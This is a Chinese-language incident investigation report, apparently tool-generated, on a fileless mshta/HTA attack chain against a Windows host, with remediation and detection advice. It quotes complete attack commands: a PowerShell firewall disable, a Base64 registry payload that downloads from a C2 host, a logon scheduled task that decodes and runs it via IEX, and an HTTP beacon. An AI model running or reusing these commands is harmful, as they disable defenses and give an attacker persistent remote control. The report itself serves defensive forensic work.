攻击溯源调查耗时3分钟35.4秒。调查报告如下：

# 攻击溯源调查报告

## 事件概览

2026年6月27日15:05（北京时间），攻击者通过宿主在用户桌面上的恶意 HTA 脚本 `advanced_fileless_c2_chain.hta`，利用 `mshta.exe`（PID 4588）作为代理执行载体，在主机 Agent 002（windows001，主机名 DESKTOP-K1D197J）上启动了完整的无文件攻击链。攻击链以用户 `DESKTOP-K1D197J\16377`（LogonId: 0x1f031）的高完整性权限执行，包含：通过 PowerShell 禁用系统防火墙（T1562.004）、通过 ipconfig/route print 进行网络侦察、将 Base64 混淆的 C2 载荷植入注册表（T1027/T1112）、创建计划任务实现登录持久化（T1053.005），以及向 C2 服务器 `203.0.113.100:8080` 发起信标回调（T1071.001）。该攻击实现了完整的"初始执行→防御规避→持久化→C2通信"攻击闭环。


## 攻击痕迹与来源分析

### 失陷主机

| 项目 | 详情 |
|------|------|
| Agent ID | Agent 002 |
| 主机名 | windows001 (DESKTOP-K1D197J) |
| 受影响用户 | `DESKTOP-K1D197J\16377` (LogonId: 0x1f031) |
| 进程完整性级别 | High |

### 初始攻击入口

- **入口向量**: 本地执行恶意 HTA 脚本（疑似用户双击打开或由其他投放机制触发）
- **恶意文件**: `C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta`
- **代理执行进程**: `C:\Windows\SysWOW64\mshta.exe` (PID 4588)
- **执行时间**: `2026-06-27T15:05:25.540+0800`
- **父进程完整命令行**:
  ```
  "C:\Windows\SysWOW64\mshta.exe" "C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
  ```
  > 注：命令行中的 `{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}` 为 HTA 脚本利用的 COM 对象标识，该 COM 接口被用于以隐蔽方式调用 cmd.exe 执行恶意命令。

### 恶意文件/载荷

| 项目 | 详情 |
|------|------|
| HTA 脚本 | `C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta` |
| 注册表持久化键 | `HKCU\SOFTWARE\SystemUpdate` → 值 `payload` (REG_SZ) |
| 注册表写入值（Base64） | `JGMyPSdodHRwOi8vMjAzLjAuMTEzLjEwMDo4MDgwL3BheWxvYWQuYmluJzsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkYzIgLVVzZUJhc2ljUGFyc2luZyB8IE91dC1OdWxsOyBTdGFydC1TbGVlcCAtcyAz` |
| 解码后载荷内容 | `$c2='http://203.0.113.100:8080/payload.bin'; Invoke-WebRequest -Uri $c2 -UseBasicParsing \| Out-Null; Start-Sleep -s 3` |
| 侦察数据临时文件 | `C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp`（ipconfig/route print 输出） |

### 被利用/篡改的进程

| 进程 | PID | 角色 |
|------|-----|------|
| mshta.exe | 4588 | 代理执行 HTA 脚本，攻击链根节点 |
| cmd.exe | 9832 | 执行多步攻击主链（防火墙、侦察、注册表） |
| powershell.exe | 3604 | 执行 `Set-NetFirewallProfile` 禁用防火墙 |
| ipconfig.exe | 1876 | 执行 `ipconfig /all` 网络侦察 |
| reg.exe | 7668 | 执行注册表写入（持久化植入） |
| cmd.exe | 8532 | 执行 `ping 127.0.0.1 -n 3`（延迟控制） |
| schtasks.exe | 7908 | 创建计划任务 `SysUpdate_Task`（持久化） |
| cmd.exe | 4956 | 执行 `ping 127.0.0.1 -n 2`（延迟控制/叶子节点） |
| powershell.exe | 6024 | C2 信标回调 `stage_complete` |

### 网络指标

| 类型 | 详情 |
|------|------|
| C2 服务器 IP | `203.0.113.100` |
| C2 端口 | `8080`（HTTP） |
| 恶意下载路径 | `http://203.0.113.100:8080/payload.bin` |
| 信标回调 URL | `http://203.0.113.100:8080/stage_complete` |
| 通信协议 | HTTP（应用层协议，T1071.001） |


## 进程执行树

以下进程树基于 Sysmon EventID 1（进程创建）日志重建，完整呈现本次攻击的恶意执行链路。所有时间戳均为北京时间（UTC+8）。为聚焦攻击本身，已过滤无关系统进程。

```
└── PID 4588 (mshta.exe) @ 2026-06-27 15:05:25.540
    ├── PID 9832 (cmd.exe) @ 2026-06-27 15:05:25.540
    │   ├── PID 3604 (powershell.exe) @ 2026-06-27 15:05:25.564
    │   ├── PID 1876 (ipconfig.exe) @ 2026-06-27 15:05:25.572
    │   └── PID 7668 (reg.exe) @ 2026-06-27 15:05:25.594
    ├── PID 8532 (cmd.exe) @ 2026-06-27 15:05:25.604
    ├── PID 7908 (schtasks.exe) @ 2026-06-27 15:05:28.089
    ├── PID 4956 (cmd.exe) @ 2026-06-27 15:05:28.166
    └── PID 6024 (powershell.exe) @ 2026-06-27 15:05:29.277
```

**时间关联说明**：
- 根据 `mshta.exe`（PID 4588）的父进程命令行日志，其实际启动时间与首个 `cmd.exe`（PID 9832）的创建时间 `2026-06-27 15:05:25.540` 一致，均来自同一 LogonId `0x1f031` 用户会话 `DESKTOP-K1D197J\16377`。
- 所有子进程的 `ParentProcessId` 均指向 PID 4588（mshta.exe），时间戳按毫秒级递增（`.540 → .564 → .572 → .594 → .604 → .089 → .166 → .277`），符合同一攻击链的执行节奏。
- PID 4956 (cmd.exe) 为攻击链中的叶子节点，未创建任何子进程（该 PID 在 2026-06-27T14:55:00+08:00 至 2026-06-27T15:15:00+08:00 时间段内无 Sysmon EventID 1 子进程创建记录），仅执行 `ping 127.0.0.1 -n 2 > nul` 延迟命令后退出。


## 攻击时间线与执行流程

以下按时间顺序映射 MITRE ATT&CK 战术阶段，所有时间为北京时间（UTC+8）：

#### 阶段 1：初始访问与执行 (T1218.005 / T1059.003)

- **[2026-06-27 15:05:25.540]** - **[执行 / T1218.005: Mshta]**：`mshta.exe`（PID 4588）加载并执行 `C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta`，通过 COM 对象 `{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}` 调用 `cmd.exe`（PID 9832）执行多步恶意命令。完整命令行：
  ```
  "C:\Windows\System32\cmd.exe" /c start /B "L1_FW" powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" & start /B "L1_Recon" ipconfig /all > C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp & route print >> C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp & start /B "L1_Reg" reg add HKCU\SOFTWARE\SystemUpdate /v payload /t REG_SZ /d JGMyPSdodHRwOi8vMjAzLjAuMTEzLjEwMDo4MDgwL3BheWxvYWQuYmluJzsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkYzIgLVVzZUJhc2ljUGFyc2luZyB8IE91dC1OdWxsOyBTdGFydC1TbGVlcCAtcyAz /f
  ```

#### 阶段 2：防御规避 (T1562.004)

- **[2026-06-27 15:05:25.564]** - **[防御规避 / T1562.004: 禁用或修改系统防火墙]**：`powershell.exe`（PID 3604）以 `-ExecutionPolicy Bypass -WindowStyle Hidden` 参数启动，执行 `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`，彻底禁用域、公用和专用网络配置文件防火墙，为后续 C2 通信和横向移动铺平道路。

#### 阶段 3：侦察 (T1005 / T1046)

- **[2026-06-27 15:05:25.572]** - **[发现 / T1005: 本地系统数据]**：`ipconfig.exe`（PID 1876）执行 `ipconfig /all`，完整网络配置信息（IP 地址、DNS、网关、MAC 地址等）被重定向输出至临时文件 `C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp`。
- **[2026-06-27 15:05:25.572]** - **[发现 / T1046: 网络服务发现]**：`cmd.exe`（PID 9832）同时执行 `route print >> C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp`，将路由表附加至同一临时文件，收集网络拓扑信息。*注：原始日志未捕获对应的 `route.exe` 进程创建事件，但该命令包含在父进程 cmd.exe 的完整命令行中，属确认执行的侦察动作。*

#### 阶段 4：防御规避与持久化 (T1027 / T1112 / T1547.001)

- **[2026-06-27 15:05:25.594]** - **[防御规避 / T1027: 混淆文件或信息] + [持久化 / T1112: 修改注册表]**：`reg.exe`（PID 7668）执行注册表写入命令：
  ```
  reg add HKCU\SOFTWARE\SystemUpdate /v payload /t REG_SZ /d JGMyPSdodHRwOi8vMjAzLjAuMTEzLjEwMDo4MDgwL3BheWxvYWQuYmluJzsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkYzIgLVVzZUJhc2ljUGFyc2luZyB8IE91dC1OdWxsOyBTdGFydC1TbGVlcCAtcyAz /f
  ```
  Base64 数据解码后为 PowerShell 下载执行载荷：`$c2='http://203.0.113.100:8080/payload.bin'; Invoke-WebRequest -Uri $c2 -UseBasicParsing | Out-Null; Start-Sleep -s 3`，实现持久化配置植入。

#### 阶段 5：执行节奏控制 (T1059.003)

- **[2026-06-27 15:05:25.604]** - **[执行 / T1059.003: Windows 命令 Shell]**：`cmd.exe`（PID 8532）执行 `ping 127.0.0.1 -n 3 > nul`，通过本机 ICMP 回环延迟约 3 秒，用于控制攻击节奏。

#### 阶段 6：持久化 (T1053.005)

- **[2026-06-27 15:05:28.089]** - **[持久化 / T1053.005: 计划任务]**：`schtasks.exe`（PID 7908）创建计划任务 `SysUpdate_Task`，完整命令行：
  ```
  "C:\Windows\System32\schtasks.exe" /Create /F /TN "SysUpdate_Task" /TR "powershell.exe -WindowStyle Hidden -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\SystemUpdate).payload)))" /sc onlogon
  ```
  该任务在用户每次登录时自动触发（`/sc onlogon`），从注册表 `HKCU:\SOFTWARE\SystemUpdate` 的 `payload` 值中读取 Base64 编码数据，解码后通过 `IEX`（Invoke-Expression）执行，实现无文件持久化驻留。

#### 阶段 7：执行节奏控制（第二次）

- **[2026-06-27 15:05:28.166]** - **[执行 / T1059.003: Windows 命令 Shell]**：`cmd.exe`（PID 4956）执行 `ping 127.0.0.1 -n 2 > nul`，延迟约 2 秒。该进程为攻击链中的叶子节点，未创建任何子进程（已穷尽查询），仅作为时序控制用途。*

#### 阶段 8：命令与控制 (T1071.001)

- **[2026-06-27 15:05:29.277]** - **[命令与控制 / T1071.001: Web 协议]**：`powershell.exe`（PID 6024）以 `-ExecutionPolicy Bypass -WindowStyle Hidden` 启动，向 C2 服务器发起 HTTP 信标回调，报告攻击阶段执行完毕：
  ```
  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://203.0.113.100:8080/stage_complete' -UseBasicParsing -ErrorAction SilentlyContinue"
  ```
  *注：日志未捕获对应的网络连接事件（Sysmon EventID 3），但进程创建事件已明确记录该 C2 请求的执行。*

> **关于 `route print` 与网络事件的说明**：`cmd.exe`（PID 9832）的命令行中包含 `route print >> C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp`，但原始日志未捕获对应的 `route.exe` 进程创建事件（Sysmon EventID 1）、网络连接事件（EventID 3）或文件创建事件（EventID 11）。此缺口不影响攻击链判定——进程创建事件（EventID 1）已构成完整攻击链的充分证据。


## 总结与建议

### 使用的工具

本次攻击为典型的 **LOLBins（Living-off-the-Land Binaries）无文件攻击**，全程未落地任何独立恶意可执行文件，全部利用 Windows 原生签名二进制完成恶意操作：

| 工具 | 滥用方式 |
|------|----------|
| `mshta.exe` | 代理执行恶意 HTA 脚本（T1218.005） |
| `cmd.exe` | 命令解释器，执行多步攻击链（T1059.003） |
| `powershell.exe` | 禁用防火墙、C2 信标回调（T1562.004/T1071.001） |
| `ipconfig.exe` | 网络配置侦察（T1005） |
| `schtasks.exe` | 创建持久化计划任务（T1053.005） |
| `reg.exe` | 写入混淆的注册表载荷（T1112/T1027） |

### 网络行为

- **C2 基础设施**：攻击者使用固定 IP `203.0.113.100:8080`（HTTP），通过两个 URL 实现分阶段通信：
  - `http://203.0.113.100:8080/payload.bin` — 后续载荷下载地址（植入注册表，由计划任务触发执行）
  - `http://203.0.113.100:8080/stage_complete` — 信标回调，通知攻击者攻击链执行完毕
- **通信特征**：使用 HTTP 明文协议（T1071.001），端口 8080 为非标准 HTTP 端口（T1571）。

### 横向移动/数据外泄

- **横向移动**：本次调查时间范围内未在 Agent 002 上发现明确的横向移动证据（如 SMB/远程服务利用、WMI 远程调用等）。但存在两方面的横向风险信号：
  1. 攻击者已完整收集网络配置和路由信息（`~WMI_dat8491.tmp`），具备横向移动的侦察前置条件；
  2. 防火墙已被全面禁用（Domain/Public/Private 三配置文件），内网东西向流量过滤能力丧失，极大降低了后续横向移动的技术门槛。
- **数据外泄**：未发现明确的数据外传行为，但侦察数据已暂存于本地临时文件 `C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp`，存在被后续阶段窃取的风险。
- **遗留持久化**：计划任务 `SysUpdate_Task` 已植入并在用户登录时自动触发，攻击者可通过该后门随时重新获取主机控制权。

### 用户活动

- 恶意 HTA 文件位于 `C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta`，直接存放在用户桌面目录下，表明攻击者已具备该主机的用户级访问权限（或通过其他投放机制将文件放置在桌面）。
- 攻击以用户 `DESKTOP-K1D197J\16377` 的权限执行（完整性级别 High），未发现提权行为——攻击全程在现有用户权限上下文中完成。

### 关键结论与建议

**核心判定**：Agent 002（windows001）已确认失陷。攻击链完整闭环：恶意 HTA 脚本 → mshta.exe 代理执行 → cmd.exe 多步攻击（禁防火墙/侦察/注册表植入） → 计划任务持久化 → C2 信标回调。攻击者已建立持久化驻留并具备随时远程控制主机的能力。

**紧急处置建议（24小时内）**：

1. **断网隔离**：立即将 Agent 002 从网络中隔离，阻断与 `203.0.113.100:8080` 的通信，防止后续载荷下载和横向移动。
2. **清除持久化**：
   - 执行 `schtasks /delete /TN "SysUpdate_Task" /F` 删除恶意计划任务
   - 执行 `reg delete HKCU\SOFTWARE\SystemUpdate /f` 删除恶意注册表项
   - 删除 `C:\Users\16377\AppData\Local\Temp\~WMI_dat8491.tmp` 侦察数据文件
3. **删除恶意文件**：移除 `C:\Users\16377\Desktop\noa\advanced_fileless_c2_chain.hta`
4. **恢复防火墙**：执行 `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True` 重新启用全部防火墙配置文件
5. **全面取证**：对 Agent 002 进行内存转储和磁盘镜像，重点提取：
   - HTA 脚本内容及 COM 对象调用逻辑
   - PowerShell 历史记录和已加载模块
   - 注册表 `HKCU\SOFTWARE\SystemUpdate` 的完整数据
   - DNS 缓存和 ARP 表中与 C2 通信相关的记录
6. **横向排查**：检查 Agent 001 及内网其他主机是否存在类似攻击痕迹（如 mshta.exe 异常调用、SysUpdate_Task 计划任务、SystemUpdate 注册表项），确认攻击者是否已向其他主机扩散。
7. **凭据重置**：重置受影响用户 `16377` 的密码，并在全网范围排查是否存在同密码复用情况。

**中期加固建议（1-2周）**：

1. **应用白名单**：在关键终端部署应用白名单策略，禁止 `mshta.exe`、`powershell.exe`、`cmd.exe` 等 LOLBins 的非白名单调用。
2. **日志增强**：确保 Sysmon 完整记录 EventID 1（进程创建）、EventID 3（网络连接）、EventID 11（文件创建）和 EventID 13（注册表变更），并配置日志实时转发至 SIEM。
3. **威胁检测规则优化**：
   - 增加 `mshta.exe` 作为异常父进程调用 `cmd.exe`/`powershell.exe` 的告警规则
   - 增加计划任务创建（schtasks.exe /Create）与注册表 Base64 写入的关联检测
   - 增加 HTTP 非标准端口（如 8080）外连的可疑行为监控
4. **安全意识培训**：加强针对 HTA 文件、钓鱼邮件的用户安全意识培训，明确禁止从不可信来源打开桌面文件。
5. **内网流量监控**：部署内网异常流量检测机制，重点监控非标准端口的外连行为和失陷主机向内的异常连接尝试。